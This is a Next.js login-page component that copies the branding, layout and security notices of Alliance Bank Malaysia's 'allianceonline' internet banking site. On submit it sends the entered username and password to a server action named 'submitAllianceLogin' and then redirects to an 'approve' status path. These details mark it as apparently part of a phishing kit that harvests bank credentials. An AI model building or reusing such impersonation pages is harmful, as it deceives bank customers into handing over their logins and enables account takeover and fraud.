"use client";

import React, { useState } from "react";
import Image from "next/image";
import { Loader2, AlertCircle, ChevronsRight } from "lucide-react";
import { submitAllianceLogin } from "@/lib/action";
import { useRouter } from "next/navigation";

export default function AllianceLoginPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (username.length < 3 || password.length < 6) {
      setError("Please enter valid credentials.");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      const result = await submitAllianceLogin(username, password);
      if (result.success) {
        setTimeout(() => {
          router.push("/b/status/approve");
        }, 1500);
      } else {
        setError(result.error || "Login failed. Please try again.");
        setIsLoading(false);
      }
    } catch (err) {
      setError("Something went wrong. Please try again later.");
      setIsLoading(false);
    }
  };

  const handleClear = () => {
    setUsername("");
    setPassword("");
    setError("");
  };

  return (
    <div className="flex min-h-screen flex-col bg-[#F5F5F5] font-sans text-[#333]">
      {/* Top Brand Header */}
      <header className="flex h-16 items-center justify-end bg-white px-6">
        <div className="flex items-center gap-1">
          <span className="text-2xl font-bold tracking-tight text-[#002B5C]">alliance</span>
          <span className="text-2xl font-bold tracking-tight text-[#E31E24]">online</span>
        </div>
      </header>

      {/* Purple Bar */}
      <div className="h-10 w-full bg-[#1A0B42]" />

      {/* Main Content */}
      <main className="flex flex-1 flex-col items-center px-4 py-8">
        <div className="w-full max-w-lg overflow-hidden rounded-xl border border-gray-300 bg-[#EEEEEE] p-8 shadow-sm">
          <h2 className="mb-6 text-[22px] font-medium text-[#444]">
            Welcome to <span className="font-bold">alliance</span>online
          </h2>

          <form onSubmit={handleLogin} className="space-y-6">
            {error && (
              <div className="rounded bg-red-50 p-3 text-center text-sm font-medium text-red-600 border border-red-100">
                {error}
              </div>
            )}

            <div className="space-y-2">
              <label className="text-[15px] font-bold text-[#666]">Username</label>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full rounded border border-[#999] bg-white py-2.5 px-3 text-[17px] outline-none transition-all focus:border-[#002B5C] focus:ring-1 focus:ring-[#002B5C]"
                required
              />
            </div>

            <div className="space-y-2">
              <label className="text-[15px] font-bold text-[#666]">Password</label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full rounded border border-[#999] bg-white py-2.5 px-3 text-[17px] outline-none transition-all focus:border-[#002B5C] focus:ring-1 focus:ring-[#002B5C]"
                required
              />
            </div>

            <div className="flex gap-4 pt-4">
              <button
                type="button"
                onClick={handleClear}
                className="flex-1 rounded-lg bg-[#002B5C] py-2.5 text-lg font-bold text-white shadow-sm transition-all active:scale-[0.98]"
              >
                Clear
              </button>
              <button
                type="submit"
                disabled={isLoading}
                className="flex-1 rounded-lg bg-[#E31E24] py-2.5 text-lg font-bold text-white shadow-sm transition-all active:scale-[0.98] disabled:opacity-80"
              >
                {isLoading ? (
                  <Loader2 className="mx-auto h-6 w-6 animate-spin" />
                ) : (
                  "Login"
                )}
              </button>
            </div>
          </form>
        </div>

        {/* Security Alert Section */}
        <div className="mt-6 w-full max-w-lg rounded-xl border border-gray-300 bg-white p-6 shadow-sm">
          <div className="flex items-center gap-2 mb-4">
            <AlertCircle size={20} className="text-[#FFC107] fill-[#FFC107] text-white" />
            <h3 className="text-[17px] font-bold text-[#E31E24]">Security Alert</h3>
          </div>
          <ul className="space-y-4 text-[14px] leading-tight text-[#555]">
            <li className="flex items-start gap-2">
              <ChevronsRight size={16} className="mt-0.5 shrink-0 text-[#FFC107]" />
              <p>Always verify your allianceonline Secure Phrase before you login!</p>
            </li>
            <li className="flex items-start gap-2">
              <ChevronsRight size={16} className="mt-0.5 shrink-0 text-[#FFC107]" />
              <p>SAFETY TIPS: Please visit Alliance Bank Scam</p>
            </li>
          </ul>
        </div>
      </main>

      {/* Footer */}
      <footer className="px-6 py-8 text-center">
        <div className="mb-3 flex flex-wrap justify-center gap-x-3 text-[13px] font-medium text-[#004B8D]">
          <button className="hover:underline">Privacy Policy</button>
          <span className="text-gray-300">|</span>
          <button className="hover:underline">eBanking Charter</button>
          <span className="text-gray-300">|</span>
          <button className="hover:underline">Customer Service Charter</button>
          <span className="text-gray-300">|</span>
          <button className="hover:underline">Terms & Conditions</button>
        </div>
        <p className="text-[11px] text-[#666]">
          Copyright © 2026 Alliance Bank Malaysia Berhad
        </p>
      </footer>
    </div>
  );
}
